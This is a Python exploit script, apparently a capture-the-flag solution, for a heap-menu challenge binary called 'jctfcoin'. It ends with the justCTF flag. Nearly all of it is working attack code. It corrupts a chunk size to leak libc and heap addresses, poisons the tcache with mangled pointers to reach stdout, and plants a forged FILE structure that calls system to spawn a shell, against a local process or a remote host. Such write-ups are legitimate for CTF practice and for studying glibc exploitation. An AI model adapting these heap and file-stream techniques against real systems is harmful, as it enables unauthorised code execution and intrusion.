#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./jctfcoin_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set follow-fork-mode parent
brva 0x141F
brva 0x1568
brva 0x1823
brva 0x18B6
brva 0x16B2
brva 0x174E
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def menu(choice: int):
    slna(b'command: ', choice)

def create(idx: int, len: int, data: bytes):
    menu(1)
    slna(b': ', idx)
    slna(b': ', len)
    sla(b'name: ', data)

def view(idx: int):
    menu(2)
    slna(b': ', idx)

def rename(idx: int, data: bytes):
    menu(3)
    slna(b': ', idx)
    sla(b'name: ', data)

def delete(idx: int):
    menu(4)
    slna(b': ', idx)

def mine(idx: int, mine: int, len: int, data: bytes):
    menu(5)
    slna(b': ', idx)
    slna(b': ', mine)
    slna(b': ', len)
    sla(b'description: ', data)


# ==================== EXPLOIT ====================
p = start()

# chunks arr address NOASLR = 0x555555558040

create(0, 0x68, b'A' * 0x10)
create(1, 0x68, b'B' * 0x10)

create(2, 0x200, b'C' * 0x10)
create(3, 0x200, b'\x00' * 0x170 + flat(
    0, 0x21,
    0, 0,
    0, 0x21,
))
create(4, 0x200, b'D' * 0x10)
rename(0, b'\x00' * 0x60 + p64(0) + p64(0x431))

delete(1)

create(1, 0x68, p64(0))
view(2)
ru(b'User balance: ')
libc.address = int(ru(b' jCTFcoins', drop=True)) - 0x203b20
slog('libc base @ %#x', libc.address)


create(5, 0x130, b'5' * 8)
create(6, 0x130, b'6' * 8)

delete(5)

view(2)
ru(b'User balance: ')
heap_base = ( int(ru(b' jCTFcoins', drop=True)) << 12 ) - 0x1000
slog('heap base @ %#x', heap_base)

create(5, 0x130, b'5' * 8)
delete(6)
delete(5)

_IO_2_1_stdout_ = libc.address + 0x2045c0
rename(1, b'A' * 0x60 + p64(0) + p64(0x151) + p64(mangle(heap_base, _IO_2_1_stdout_ - 0x10 + 0x1)))

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = libc.sym.system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc.sym._IO_wfile_jumps - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

create(5, 0x130, b'5' * 8)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

create(6, 0x130, payload)

interactive()
# justCTF{m4yb3_1ts_n0t_4s_thr34d_l0c4l_4s_1_3xp3ct3d}
